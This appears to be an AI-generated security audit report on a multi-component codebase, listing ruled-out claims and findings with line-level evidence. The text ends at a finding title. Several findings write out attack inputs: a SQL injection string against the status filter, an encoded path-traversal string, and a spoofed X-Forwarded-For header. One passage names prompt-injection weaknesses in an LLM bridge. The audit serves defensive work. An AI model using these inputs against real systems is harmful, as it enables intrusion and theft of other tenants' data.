architecture.fell_back_and_why: PLUGIN AGENTS ABSENT. The nine plugin subagents named in references/team.md (ehs-web-api, ehs-mobile, ehs-infra-cloud, ehs-supply-chain, ehs-ai-safety, ehs-privacy-abuse, ehs-local-app, ehs-remediator, ehs-verifier) are not registered in this harness, so the corpus's own documented fallback path was used: general-purpose sub-agents carrying explicitly in the prompt, because a subagent inherits neither the skill nor the leader's context, the role order from team.md, the filesystem path of that role's knowledge pack, the full nine-clause safety contract, the FP-01..FP-11 rules of triage.md, the COV-01/02/03 rules of coverage.md, the audit-mode no-edit instruction, the unaided-pass-first ordering with the control_at requirement for any refutation, and the cwe / severity / triage / scope / searched requirements verbatim. CONCURRENCY. Budget discipline capped in-flight sub-agents at three, dispatched in two waves: wave 1 = support-desk-api, promptbridge-mlflow, edge-fleet-salt; wave 2 = archive-vault-vertx, courier_app. LANES NOT STAFFED AS SUB-AGENTS. ehs-supply-chain was not spawned; the lead audited the four dependency manifests (composer.json, pom.xml, pubspec.yaml, pyproject.toml) itself, key by key per COV-02, and folded the one finding that survived triage (floor-pinned, lockfile-free Python dependencies) into the promptbridge lane rather than duplicating it. The absence of composer.lock / pubspec.lock was deliberately NOT reported: the tree is a 55-file excerpt with no vendor or build directory, so a missing lockfile is an artifact of the excerpt and not evidence about the project. ehs-privacy-abuse and ehs-local-app were not staffed - no standalone CLI, desktop app, installer or published library, and the personal-data questions were absorbed by the lanes that own the data paths. LANES NOT RUN. archive-vault-vertx (Java/Vert.x) and courier_app (Flutter/Android) were dispatched as sub-agents but had NOT returned when this report was written. Per references/team.md, a lane that did not return was NOT RUN: NO findings are claimed for either component, and the two lanes are declared undone here rather than reconstructed by the lead. Nothing in this report speaks to archive-vault-vertx's JWT verification, XML manifest parsing, blob store path handling, SQL layer or retention sweeper, nor to courier_app's AndroidManifest, WebView, deep links, storage or client-side cryptography. VERIFIER NOT RUN. The step-8 VER-09 blind adversarial pass over the finished list was NOT executed as a separate agent: with two lanes still outstanding there was no finished list to hand it, and running it against a partial list would have produced a verification claim wider than what was verified. The findings below therefore carry each specialist's own triage only, and have NOT survived an independent blind critic. ONE LANE CROSS-CHECKED BY THE LEAD. While the promptbridge-mlflow specialist was outstanding and looked stalled, the lead read all nine of that component's files directly and independently reached the same core defects (traceback in the 500 response, unvalidated client-supplied model_uri into mlflow.pyfunc.load_model, per-request operator_note spliced into the system turn, unfenced RAG interpolation, http_fetch whose host allowlist is wired to a tool that is not enabled, eval-backed calculator, /healthz outside the auth mount, uncapped top_k and max_tokens). The specialist then returned and its report is what ships; the lead's independent read is recorded as corroboration, not as a second source. MODE AND INTEGRITY. Mode was audit. A sha1 baseline of all 55 target files was taken before dispatch and re-checked after: the tree is unmodified.

Noted but not reported: the call still lacks escapeshellarg, so a deployment change that sources LOG_UNIT from caller-influenced data turns it into CWE-78 on an unauthenticated route.

ruled_out.killed_by: support-desk-api/config/settings.php:27 - the omission makes cross-origin DELETE harder, not easier; it fails closed. A functional inconsistency with public/index.php:54, not a vulnerability.

ruled_out.killed_by: edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:25-29 - the header is confined to /assets/, which serves static files from root /srv/www with no cookie, no session and no Access-Control-Allow-Credentials. This is exactly the decoy shape triage.md records the corpus having reported before.

ruled_out.assertion: Access-Control-Allow-Origin with Allow-Credentials on the nginx /api/ location is an origin-reflection defect
ruled_out.killed_by: edge-fleet-salt/pillar/fleet.sls:29 - a single literal origin (https://console.internal.example) reaching the template through the state's fixed context at salt/webproxy/init.sls:28. The value is constant per render, is not derived from the request and cannot be '*'; missing Vary: Origin is a cache-correctness note, not a leak, because the header never varies.

ruled_out.killed_by: edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:20 (ssl_protocols TLSv1.2 TLSv1.3 - no downgrade to report) and :15 (no port-80 listener exists, so there is no cleartext entry point for HSTS to close). ruled_out.assertion: A retrieved chunk containing {braces} causes format-string injection during prompt assembly
ruled_out.killed_by: promptbridge-mlflow/bridge/prompts.py:37, :48 and :56 - untrusted values are always .format() arguments, never the format string, and nothing calls .format() on the assembled prompt afterwards (assemble at prompts.py:65 concatenates).

ruled_out.assertion: The tool MANIFEST advertises tools independently of tools.enabled, so a disabled tool can be invoked
ruled_out.killed_by: promptbridge-mlflow/bridge/tools.py:87 - registry() filters by self.enabled, so an advertised-but-disabled tool returns 'unknown tool' rather than executing. A consistency defect, not a security one.

findings.title: The /admin route group is mounted with no authentication middleware, and /admin/impersonate mints a session token for any user id
findings.evidence: public/index.php:47-55 builds the /tickets group and closes it with `})->add(new AuthMiddleware($pdo));` (line 55). public/index.php:58-63 builds the /admin group with tenants/sessions/logs/impersonate and closes it at line 63 with no `->add(...)`. No global auth middleware exists: the only app-level middleware are the CORS closure (line 25) and the error middleware (line 39). An unauthenticated `POST /admin/impersonate` with {"user_id":N} reaches AdminController.php:56, which loads any user (line 61) and inserts a live session at lines 66-71, returning the plaintext token in the body (line 73).
findings.impact: Any caller that can reach the listener takes over any account in any tenant: the returned token is a full session accepted by AuthMiddleware. The same mount also exposes every tenant's billing_email (AdminController.php:27), every live session with its user email (line 42) and the host's journal (line 86). Precondition: network reach to the HTTP port; no credential of any kind is needed.
findings.recommendation: Attach the same middleware chain to the /admin group (`->add(new AuthMiddleware($pdo))`) and gate it on the role attribute; deny by default so a newly added group inherits authentication rather than opting into it.

triage.reason: No skippable-proof layer exists. The only middleware wrapping every route is the CORS closure (public/index.php:25) and the error middleware (line 39); AuthMiddleware is attached to one group only, at line 55.

The comment at public/index.php:57 claims the console is 'only published on the internal VLAN', but no binding, ingress or firewall artifact is in scope, and the claimed bound does not bound the exposure anyway: the global CORS reflection (line 30) plus the blanket OPTIONS handler (line 45) let any web page loaded by any browser that can route to the host preflight and then POST /admin/impersonate and read the minted token cross-origin.
A second principal is explicit: impersonate takes an arbitrary user_id and issues a session bound to that user's tenant (AdminController.php:61,71), crossing both the user and the tenant boundary.

scope.established_by: The route group at public/index.php:58-63 registers four handlers and terminates without a middleware attachment, unlike the group at 47-55.

searched.for: any app-level or group-level auth middleware that would cover /admin
searched.found: nothing - only the CORS closure at :25 and addErrorMiddleware at :39

searched.for: an in-handler authentication or role check inside tenants/sessions/logs/impersonate
searched.found: nothing - no request attribute is read in any of the four handlers

searched.for: a registration hook or static bootstrap that could apply it globally
searched.found: nothing - it is a plain PSR-15 middleware instantiated once, at public/index.php:55

findings.title: impersonate performs no function-level authorization: the role attribute AuthMiddleware computes has zero readers anywhere in the service
findings.evidence: AuthMiddleware.php:46 selects `u.role` and line 65 publishes it as a request attribute. `grep -rn role support-desk-api` returns exactly two hits, both inside AuthMiddleware (the SELECT and the withAttribute). No controller reads it. impersonate (AdminController.php:56-74) checks only that the target user row exists (line 61) and then issues a session for that user's tenant (line 71). Nothing constrains the target to the caller's tenant, excludes privileged targets, or requires an operator role.
findings.impact: This survives the fix for the missing mount: once AuthMiddleware is attached to /admin, every authenticated customer would still be able to mint a 30-minute session for any user id, including operators and users of other tenants - vertical and horizontal privilege escalation from an ordinary ticket-requester token. It also survives the reverse fix: adding a role column check inside the handler does nothing while the route stays unauthenticated.
findings.recommendation: Require an explicit operator role for every /admin handler and bind impersonation to a permitted target set (same tenant, non-privileged target) before the INSERT at AdminController.php:67; make the role attribute the thing that is read, not just the thing that is computed.

triage.reason: No service layer sits between the route and the INSERT: the handler runs the statement itself at AdminController.php:67-71. The only middleware in the chain (public/index.php:25,39) makes no authorization decision.
The target of the impersonation is a different principal by construction - $body['user_id'] at AdminController.php:59 names another row and the session is minted with that row's tenant_id at line 71.

Not a wide-looking construct applying narrowly: the handler accepts any integer user_id with no narrowing condition anywhere in the file, and the SELECT at line 61 is unfiltered (FROM users WHERE id = ?).

scope.established_by: The role attribute is produced at AuthMiddleware.php:65 and consumed nowhere; the handler's only precondition is the existence of the target row.

searched.for: any reader of the role request attribute
searched.found: nothing outside AuthMiddleware.php:46 and :65

searched.for: a tenant or privilege constraint on the impersonation target
searched.found: nothing - the SELECT at :61 has no tenant predicate and no role predicate

searched.for: an operator/role allowlist or an admin-token setting the handler could consult
searched.found: nothing - no auth-related key exists in the file

findings.title: SQL injection through the ?status filter: Sanitize::statusClause interpolates the raw query string into the WHERE clause
findings.evidence: TicketController.php:26 reads the query params; line 35 appends `Sanitize::statusClause((string) ($q['status'] ?? ''))` to the SQL string; Sanitize.php:42-47 splits the CSV on commas, trims the parts and returns " AND status IN ('" . implode("','", $parts) . "')" with no quoting, escaping or allowlist. The result is executed at TicketController.php:40 via Db::all, whose single bound parameter is the tenant id and sits earlier in the statement. ?status=x') OR 1=1 --  closes the IN list and neutralises the tenant predicate; a UNION with six columns matching the SELECT list at lines 33-34 reads any table the DB user can see, including api_sessions and users.
findings.impact: Any authenticated caller reads every tenant's tickets and can pivot to arbitrary tables through UNION - session rows and user emails are joinable in one request. PDO::ATTR_EMULATE_PREPARES=false (Db.php:27) blocks stacked statements, so this is read/inference rather than direct write, which is the only thing keeping it short of full database compromise.
findings.recommendation: Bind the statuses: generate one ? per part and pass the values through the existing parameter array, or reject any value not in a declared status allowlist the way sortColumn already does at Sanitize.php:28.

triage.reason: Db::all (Db.php:35-40) prepares whatever string it is handed; it neither validates nor escapes. No layer between TicketController.php:35 and the execute at Db.php:38 inspects the fragment.
The value is $_GET['status'], read at TicketController.php:26 and passed to statusClause at line 35 with only a cast to string; the trim inside Sanitize.php:42 removes whitespace and nothing else.

The construct is what it looks like. Its two siblings in the same class do fail closed - sortColumn (line 28) is a strict in_array against the settings allowlist and direction (line 33) collapses to DESC - which is what makes the third one's raw concatenation a defect and not a house style.

scope.established_by: The fragment is built by string concatenation in Sanitize::statusClause and spliced into the statement at TicketController.php:35 before it reaches prepare().
scope.narrowed_by: GET /tickets is the only caller of statusClause in the component.

searched.for: escaping, quoting or a validation step applied to the SQL string before prepare
searched.found: nothing - Db::all prepares and executes verbatim (lines 37-38)

searched.for: other callers that might pass a constrained value
searched.found: one caller, TicketController.php:35, passing the raw query parameter

searched.for: a status allowlist comparable to tickets.sortable that the function could have used
searched.found: nothing - sortable (line 34) exists, no equivalent status list does

findings.title: Path traversal in attachment download: the file name is rawurldecoded straight into the storage path while the sibling delete handler sanitizes it
findings.evidence: Route GET /tickets/{id}/attachments/{name:.+} (public/index.php:53) - the .+ placeholder matches separators. AttachmentController.php:52 builds the base from the int-cast id, then line 53 does `$path = $base . '/' . rawurldecode((string) $args['name']);` with no basename, no normalisation and no realpath check against the base, and line 59 reads it with file_get_contents. ..%2f..%2f..%2f..%2fetc%2fpasswd decodes to ../../../../etc/passwd inside the handler, after any web-server path normalisation has already run. The sibling remove() at line 71 passes the same argument through Sanitize::filename first; download does not.
findings.impact: Any authenticated caller reads any file readable by the PHP worker - config/settings.php with the live DB credentials, .env, /proc/self/environ, other tenants' attachments. Response is the raw bytes. The 25 MB cap at settings.php:18 governs uploads only, so a large target file is loaded whole into memory by line 59.
findings.recommendation: Run the decoded name through Sanitize::filename exactly as remove() does at line 71, and additionally assert str_starts_with(realpath($path), realpath($base)) before opening.

triage.reason: Nothing between the route and file_get_contents canonicalises the path: AuthMiddleware (the only middleware on this group, public/index.php:55) touches identity, not paths, and Slim's route placeholder {name:.+} at public/index.php:53 is explicitly permissive about separators.

The sink is file_get_contents on an attacker-assembled absolute path (AttachmentController.php:59) with the bytes written into the response body - a read primitive, not a parser that would neutralise the input.
Only the {id} half is narrowed - (int) $args['id'] at line 52 - and that half is not the one that reaches the traversal. The {name} half is unconstrained at every step.

scope.established_by: The concatenation at line 53 is the only path assembly, and the route pattern that feeds it permits separators.
scope.narrowed_by: Read-only: this handler does not write, so the traversal is a disclosure primitive, not a write primitive.

searched.for: whether a suitable filename control exists and is simply not called here
searched.found: Sanitize::filename at line 16-23 (basename, character allowlist, leading-dot strip) - adequate, and applied at AttachmentController.php:71 but not at :53

searched.for: a realpath/normalisation check anywhere in the class
searched.found: nothing - no realpath, no str_starts_with, no basename outside the Content-Disposition header at line 64

searched.for: a stricter route constraint on {name}
searched.found: the opposite - {name:.+} at line 53, against a bare {name} on the delete route at line 54

findings.title: GET /tickets/{id} returns any ticket in any tenant: the sibling PATCH handler scopes by tenant and show does not
findings.evidence: TicketController.php:49-54 runs SELECT id, tenant_id, requester_id, assignee_id, subject, body, status, priority, created_at FROM tickets WHERE id = ? with [$id] only - the tenant_id attribute set by AuthMiddleware.php:64 is never read in this method. Lines 60-65 then fetch every comment on that ticket. The sibling update() at lines 104-108 does the ownership check correctly (WHERE id = ? AND tenant_id = ?), and index() at line 34 scopes by tenant, so the asymmetry is within the same class.
findings.impact: Any authenticated user of any tenant enumerates integer ticket ids and reads other tenants' ticket bodies and full comment threads - the support-ticket corpus is exactly where customers paste credentials, personal data and incident detail. No precondition beyond one valid session.
findings.recommendation: Add AND tenant_id = ? to the SELECT at line 52 with the tenant attribute, mirroring line 106, and return 404 on miss.

triage.reason: There is no mandatory tenant scope layer: Db::all/one (Db.php:35-48) run the SQL they are given, and the middleware chain on this route (public/index.php:55) sets attributes without rewriting queries.
The response is not public data: the row it returns carries tenant_id and requester_id, and the follow-up query at line 60 returns other users' comment bodies.
Ticket subject/body and comment bodies are customer-submitted support content belonging to another tenant, which is precisely the data the tenant_id column exists to separate.

scope.established_by: The WHERE clause at line 52 names only the path identifier; the tenant attribute is available on the request and unused in this method.
scope.narrowed_by: Read-only - write paths in the same class do check ownership at line 106.

searched.for: a tenant scope injected into the PDO connection or a query rewriter
searched.found: nothing - it sets three request attributes (lines 63-65) and calls the handler

searched.for: a default tenant predicate or row-level-security wrapper
searched.found: nothing - all/one pass the SQL through unchanged

searched.for: the same effect reached by a handler that does check, to confirm the asymmetry
searched.found: index() scopes at line 34 and update() scopes at line 106; only show() does not

findings.title: Attachment upload, download and delete never verify that the ticket belongs to the caller's tenant
findings.evidence: All three handlers derive the storage directory from the path id alone - $this->settings['storage']['attachments'] . '/' . (int) $args['id'] at lines 24, 52 and 70 - and the class holds no PDO at all (constructor at line 17 takes only $settings), so no ownership query is possible or performed. AuthMiddleware runs (public/index.php:52-55) and its tenant_id attribute is never read in this file. moveTo at line 42 overwrites an existing name silently; unlink at line 75 deletes.
findings.impact: Any authenticated user of any tenant reads another tenant's attachments by ticket id, deletes them, and overwrites them with chosen content that the victim's operators then open - read, destroy and substitute across the tenant boundary. Distinct from the traversal defect: sanitising the file name leaves all three of these open.
findings.recommendation: Give the controller the PDO and run the same ownership predicate update() uses (TicketController.php:106) at the top of each handler, or resolve the directory from a ticket record already scoped to the caller's tenant.

triage.reason: The only middleware on the route group (public/index.php:55) authenticates; it does not authorize objects. No other layer sees the ticket id.
The directory is keyed by ticket id, not by user or tenant (line 24), so one caller's path and another tenant's path are the same path - the boundary crossed is the tenant.
Attachments on support tickets are customer-submitted files; the storage layout at settings.php:17 keeps them off the web root precisely because they are not public.

scope.established_by: Three handlers build a path from an unvalidated ticket id; the class has no database handle with which to check ownership.
scope.narrowed_by: Requires a valid session - the /tickets group is authenticated.

searched.for: an ownership-checking middleware on the attachment sub-routes specifically
searched.found: nothing - lines 52-54 sit in the same group as the ticket routes and add no further middleware

searched.for: any read of the tenant_id or user_id request attribute
searched.found: nothing - the $request parameter is used only for getUploadedFiles at line 30

searched.for: the ownership predicate that ought to be reused
searched.found: line 106, SELECT id FROM tickets WHERE id = ? AND tenant_id = ?

findings.title: CORS reflects any Origin with Access-Control-Allow-Credentials: true, on every route including the unauthenticated admin console
findings.evidence: config/settings.php:24-25 sets allow_origin => '*' together with allow_credentials => true - a combination browsers reject outright, so public/index.php:30 converts it into reflection: $allow = ($configured === '*' && $origin !== '') ? $origin : $configured; emitted at line 33 alongside Access-Control-Allow-Credentials: true at line 34. The middleware is added with $app->add() at line 25, i.e. app-wide, and the catch-all $app->options('/{routes:.+}', ...) at line 45 answers every preflight with 200. Allowed headers include Authorization and Content-Type (settings.php:26) and allowed methods include POST and PATCH (line 27).
findings.impact: Any web page in any browser that can route to the host reads authenticated JSON responses cross-origin. It needs no credential at all against /admin, which is unauthenticated: an attacker page preflights and then POSTs /admin/impersonate and reads the minted token out of the response body - which is how the 'internal VLAN' placement is defeated from an operator's own browser. Against /tickets it upgrades the cookie fallback into a cross-origin read of ticket data.
findings.recommendation: Replace the wildcard with an exact-match allowlist of partner origins compared in full, and never send Allow-Credentials with a reflected or wildcard origin; if the widget genuinely needs arbitrary embedding, drop credentials and require the Authorization header.

triage.reason: No layer strips or overrides the header: the closure at public/index.php:25-37 is the last thing to touch the response on every path, and no reverse-proxy configuration is present in the component.
The responses made readable are ticket bodies and comments (TicketController.php:67), tenant billing emails (AdminController.php:27), live session rows (line 42) and impersonation tokens (line 73).

This is the decoy shape FP-11 was written for, and it is not that here: the header is not confined to /healthz. $app->add() at public/index.php:25 registers the closure app-wide, so it wraps the authenticated /tickets group (line 47), the /admin group (line 58) and /healthz alike, and the reflection at line 30 has no per-route condition.

scope.established_by: App-level middleware registration at line 25 plus the unconditional reflection ternary at line 30.
scope.narrowed_by: Only requests that carry an Origin header are reflected; a caller sending no Origin gets the literal '*' - which is not a narrowing that helps, since browsers always send it cross-origin.

searched.for: an origin allowlist the code might consult instead of the wildcard
searched.found: nothing - a single 'allow_origin' string, set to '*' with a comment saying the origins cannot be enumerated

searched.for: a route-scoped variant of the CORS middleware, or a Vary: Origin header
searched.found: nothing - one app-wide closure, and no Vary header is set

searched.for: handlers that override the header per response
searched.found: nothing - controllers set only Content-Type and, for downloads, Content-Length/Content-Disposition

findings.title: Mass assignment on PATCH /tickets/{id}: the whole request body becomes the UPDATE set, and the configured fillable allowlist has no readers
findings.evidence: TicketController.php:113 takes the parsed body wholesale, line 114 removes exactly two keys (id, created_at), lines 115-120 clamp body and subject if present, and line 122 hands the remaining map to Db::update, which writes every key as a backticked column (Db.php:67-70). config/settings.php:32 declares 'fillable' => ['subject','body','priority']; grep -rn fillable over the component returns that declaration and nothing else - zero readers. So {"status":"closed","assignee_id":7,"tenant_id":99,"requester_id":3} is persisted.
findings.impact: Within the caller's tenant (ownership is checked at line 106) any requester rewrites workflow state and ownership fields: close or reassign tickets, rewrite requester_id, and set tenant_id to another tenant so their chosen content lands in a victim tenant's console. An unknown column raises a PDO exception, giving a column-enumeration oracle through the 500 response. The two explicit unsets show the risk was known; the allowlist that would have covered it was written into config and never wired.
findings.recommendation: Intersect the body with $this->settings['tickets']['fillable'] before line 122 (array_intersect_key($changes, array_flip(...))) rather than subtracting two known-bad keys.

triage.reason: Db::update's only guard is the table allowlist at Db.php:58; it accepts any column key from its caller and binds the value (lines 67-70). No DTO, schema or serializer sits in front.
The map is the parsed request body, read at line 113, with only id and created_at removed at line 114.
The writable columns carry security meaning: tenant_id is the isolation key used by index() and update() themselves, and status/assignee_id/requester_id govern the support workflow.

scope.established_by: The unfiltered body reaches Db::update as the SET map; the declared allowlist is never read.
scope.narrowed_by: The ownership check at line 106 confines the target row to the caller's own tenant, so this rewrites the caller's tickets, not arbitrary ones.

findings.title: Session cookie accepted as an ambient credential with no CSRF token or origin check on state-changing routes
findings.evidence: AuthMiddleware.php:34-37: when no Bearer header is present the middleware falls back to $request->getCookieParams()['desk_session'] and treats it as the token. The docblock at lines 22-24 states the fallback exists because the widget is embedded on partner pages, which means the cookie has to be cross-site-capable to work at all. The mutating routes POST /tickets, PATCH /tickets/{id}, POST and DELETE .../attachments (public/index.php:49-54) carry no anti-CSRF token, no Origin/Referer check and no custom-header requirement; grep for 'csrf' over the component returns nothing.
findings.impact: A page the victim visits performs authenticated writes as them - create tickets, rewrite ticket fields via the mass-assignment path, delete attachments - with no token. Paired with the reflected CORS headers the response is also readable. The chain depends on the cookie being sent cross-site.
findings.recommendation: Require the Authorization header for every state-changing route, or bind a per-session CSRF token checked on unsafe methods; if the cookie fallback must stay, restrict it to safe methods and set SameSite explicitly at the point of issue.

triage.reason: No CSRF layer exists in the component: the middleware stack is CORS (public/index.php:25), error handling (line 39) and this middleware (line 55).

The exculpation WEB-15 names is a SameSite=Lax/Strict cookie, and the Set-Cookie is issued by the sign-in redirect referenced at AuthMiddleware.php:24, which is not in the files in scope. The design's own requirement - a cookie that works from an iframe on a partner domain - can only be met by SameSite=None, which is why it is reported rather than dropped, but the attribute cannot be pointed at.

scope.established_by: The cookie is an accepted credential for every route in the authenticated group, including the four unsafe methods.
scope.narrowed_by: Callers that present a Bearer header never reach the cookie branch (line 35), so this affects widget/browser sessions only.

searched.for: any anti-forgery control or origin check
searched.found: nothing - X-Requested-With appears only as an allowed CORS header at config/settings.php:26, never as a requirement

searched.for: the sign-in route that issues desk_session, to read its cookie attributes
searched.found: nothing - no login route is registered in this component

findings.what_would_settle_it: The Set-Cookie attributes emitted by the sign-in redirect that drops desk_session. SameSite=None (which the partner-embedded widget requires) confirms it; SameSite=Lax or Strict would reduce it to the GET-navigation surface.

findings.title: Database password falls back to empty string, and the phpdotenv dependency that would supply it is never loaded
findings.evidence: config/settings.php:13: 'pass' => getenv('DB_PASS') ?: ''. composer.json:11 requires vlucas/phpdotenv, and grep -rn 'Dotenv|\.env' over the component returns only that composer line - public/index.php:5 requires the autoloader and goes straight to require .../config/settings.php at line 15 without ever calling Dotenv::createImmutable(...)->load(). So a deployment that puts DB_PASS in a .env file - the reason the dependency is there - gets getenv() returning false and connects with an empty password instead of failing. ?: is falsy-coalescing, so a password of "0" collapses the same way.
findings.impact: Silent fail-open on the database credential: the service starts and works against a database that accepts an empty password rather than refusing to boot, and the same literals give an attacker who reads config/settings.php (see the traversal finding) the account name to try. Whether it is live depends on the deployment's env injection.
findings.recommendation: Fail closed: throw when DB_PASS is unset instead of defaulting to '', and either load the .env explicitly in public/index.php before line 15 or drop the phpdotenv dependency so the mechanism does not look present.

triage.reason: This is a configuration default, not a value reaching a sink from an attacker.

The fallback is not gated by an environment flag: config/settings.php is loaded unconditionally at public/index.php:15 and is the only settings file in the component - there is no separate production configuration that would override line 13.

Whether the process environment carries DB_PASS in production, and whether the DB account rejects empty passwords, are facts about the deployment; no manifest, compose file or secret-manager artifact is in scope.

scope.established_by: The literal default on line 13 combined with the absence of any Dotenv load before the settings file is read.
scope.narrowed_by: Only the password defaults to a usable-but-empty value; dsn and user default to local-dev literals that would simply fail to connect elsewhere.

searched.found: nothing - line 5 autoloader, line 15 settings, no env bootstrap

searched.found: nothing outside composer.json:11

findings.title: No security event is logged anywhere: monolog and a log path are configured, and the service makes zero logging calls
findings.evidence: composer.json:10 requires monolog/monolog and config/settings.php:37-40 declares logs.unit and logs.path. grep -rni 'monolog|logger|error_log' over the whole component returns those two declarations and nothing else - no logger is constructed, injected or called. public/index.php:39 passes logErrors=true to addErrorMiddleware without supplying a logger, so Slim's default handler writes to PHP's error log, not to the configured path. Consequently AdminController::impersonate (lines 56-74) mints a session for an arbitrary user and leaves no record; failed authentications (AuthMiddleware.php:54, 59) leave none either.
findings.impact: An impersonation, a cross-tenant read or a failed-token sweep cannot be detected or reconstructed after the fact. This is what turns each of the other findings from an incident into an unbounded one: the /admin/logs endpoint returns the systemd journal, which holds no application record of any of it.
findings.recommendation: Construct the Monolog handler from settings.logs.path in public/index.php, pass it to addErrorMiddleware, and log the security-relevant events explicitly: authentication failure with the presented prefix only, impersonation with actor and target, and attachment delete.

triage.reason: No layer logs on the service's behalf: the middleware stack is CORS, error handling and auth, and the error middleware is given no logger at public/index.php:39.
The absence is in the shipped bootstrap itself - public/index.php is the single entry point and constructs no logger on any branch.
An external aggregator cannot collect what is never emitted; the gap is at the source, not at the transport. A web-server access log records the request line, not which user was impersonated.

scope.established_by: A declared logging dependency and destination with zero call sites in the component.

searched.for: any logging call site
searched.found: nothing - only the composer requirement and the two settings keys

searched.for: a logger passed to Slim's error middleware
searched.found: nothing - addErrorMiddleware at line 39 takes three booleans and no LoggerInterface

findings.title: Session token digest compared with loose != instead of a constant-time equality
findings.evidence: AuthMiddleware.php:43 computes $digest = hash('sha256', $presented) and line 58 decides authentication with if ($session['token_digest'] != $digest). Two effects: PHP 8 still compares two numeric strings numerically, so a stored digest and a presented digest that both match 0e[0-9]{62} compare equal while differing; and != on strings is not constant time, unlike hash_equals.
findings.impact: The type-juggling path requires a stored digest in scientific-notation form, which is astronomically unlikely for sha256 over the 192-bit secrets minted at AdminController.php:66 - this is a correctness defect in an authentication decision rather than a practical bypass. The timing channel is the residual, and it is small over a network. Reported because the line is the authentication decision itself.
findings.recommendation: if (!hash_equals((string) $session['token_digest'], $digest)) - one call, both effects.

triage.reason: This comparison is the whole authentication decision; the SQL at lines 44-51 selects by the 8-character prefix only (line 50), so nothing else confirms the secret.
One operand derives directly from the caller-supplied token (header or cookie, lines 34-37) via the hash at line 43.

Bounded: the value space of sha256 digests makes the juggling arm effectively unreachable, so the impact does not reach a user under any deployment that can be pointed at. Severity is set to low on this basis rather than the finding being deleted.

scope.established_by: The single equality that gates the handler call at line 67.
scope.narrowed_by: Only the digest comparison; the surrounding session predicates (revoked_at, expires_at at line 49) are bound parameters and correct.

searched.for: a constant-time comparison used elsewhere that this line diverges from
searched.found: nothing - no hash_equals anywhere

searched.for: how the compared secret is generated, to size the juggling risk
searched.found: bin2hex(random_bytes(24)) at line 66 - 192 bits from a CSPRNG, so the secret itself is sound

findings.what_would_settle_it: The column type and stored form of api_sessions.token_digest, plus whether any historical row was written by a different minting path; a digest stored in a non-hex form would widen the numeric-string arm.

findings.title: X-Forwarded-For trusted from every source, so the /admin/ IP allowlist is bypassable by any client
findings.class: Access-control bypass via spoofable client IP
findings.evidence: L5-7: real_ip_header X-Forwarded-For; real_ip_recursive on; set_real_ip_from 0.0.0.0/0; - every peer, including an arbitrary internet client, is a trusted proxy, so nginx overwrites $remote_addr with a value taken from the request header. L42-44: location /admin/ { allow {{ admin_cidr }}; deny all; } - the ngx_http_access_module decides on $remote_addr, i.e. on the rewritten value. A request GET /admin/ with X-Forwarded-For: 10.42.7.1 (admin_cidr = 10.42.7.0/24, pillar/fleet.sls:28) is evaluated as coming from the management network. real_ip_recursive on makes it worse: nginx walks the header right-to-left past every trusted entry, and all entries are trusted, so the attacker picks any position in the chain.
findings.impact: Anyone who can reach 443 on an edge node reaches the operator console at /admin/ with no other credential, and the same forged chain is re-emitted upstream by $proxy_add_x_forwarded_for (L34), so the backend's own IP logic and its audit logs record the address the attacker chose. Precondition: TCP reachability to the listener, nothing else.
findings.recommendation: Replace set_real_ip_from 0.0.0.0/0 with the actual load-balancer addresses/prefixes (a new pillar key, e.g. webproxy:trusted_proxies, rendered as one set_real_ip_from per entry) and keep real_ip_recursive on only once that list is finite. An IP allowlist must not be the only control on /admin/; add authentication at the proxy or the backend.

triage.reason: No compensating layer exists in the tree: grep for firewall/iptables/nft states across edge-fleet-salt returns nothing, and the webproxy state (salt/webproxy/init.sls:4-41) installs nginx and this config only.
The value that decides the outcome is the X-Forwarded-For request header, supplied verbatim by the caller.

The 443 listener being public is intended; the finding is not the listener but the /admin/ location, which the comment on L41 declares as 'restricted to the management network' - the intent is stated and not achieved.
The narrowing candidate would be that real_ip only affects logging; it does not - $remote_addr is what allow/deny reads, and both directives sit in the same rendered file.

scope.established_by: salt/webproxy/init.sls:19-33 renders this template to /etc/nginx/conf.d/edge.conf on every minion matching roles:edge-proxy (salt/top.sls:5-7)

searched.for: a firewall, a second ACL, or any state restricting who can reach 443/the admin path
searched.found: nothing - the state installs the package, writes the token, renders this config and starts the service

searched.for: a network control in front of the proxy
searched.found: nothing

searched.for: a trusted-proxy list that the template forgot to use
searched.found: nothing - only upstream_host, upstream_port, admin_cidr and widget_origin exist

findings.title: Telemetry agent .deb fetched over cleartext HTTP with no source_hash and installed with dpkg -i as root
findings.class: Download of code without integrity check
findings.evidence: pillar/fleet.sls:23 agent_package_url: http://packages.internal.example/...deb (the only http:// URL in the pillar; every other endpoint is https). salt/telemetry/init.sls:5-10 file.managed: - source: {{ telemetry['agent_package_url'] }} with no source_hash. salt/telemetry/init.sls:12-17 cmd.run: - name: dpkg -i /var/cache/fleet/telemetry-agent.deb, which runs as root and executes the package's maintainer scripts (preinst/postinst).
findings.impact: Anyone able to answer for packages.internal.example - ARP/DNS spoofing on the edge segment, a rogue node, a compromised mirror, a transparent proxy - serves a .deb whose postinst runs as root on every node carrying roles:edge-proxy or roles:collector. There is no signature check anywhere on this path: no source_hash, no GPG, no apt (which would at least verify the repository signature). Precondition: a network position between an edge node and the package host.
findings.recommendation: Serve the package over HTTPS and pin it: add - source_hash: sha256=... to the file.managed (Salt refuses to install on mismatch), or drop the file.managed/cmd.run pair entirely in favour of pkg.installed against a signed apt repository configured with pkgrepo.managed and its key.

triage.reason: grep across the tree for source_hash|gpg|verify returns no hit; dpkg -i does not verify signatures by itself and no dpkg-sig/debsig configuration is managed here.
The bytes installed are whatever the HTTP response carries; an on-path attacker controls them fully.
An internal hostname is not a control. The pillar comment does not claim a signed channel, and internal-only reachability is not established anywhere in the tree.
No out-of-repo control is claimed for this path - no ticket, no statement, no repo configuration; and per FP-08 an absent claim could only be UNKNOWN, never HOLDS.

scope.established_by: salt/top.sls:5-11 applies telemetry to roles:edge-proxy and roles:collector

searched.found: nothing

searched.for: a hash/signature key alongside agent_package_url, or an https variant
searched.found: nothing - line 23 is the only reference and it is http://

findings.title: CMDB-sourced pillar value interpolated unquoted into a root cmd.run (telemetry-register-node)
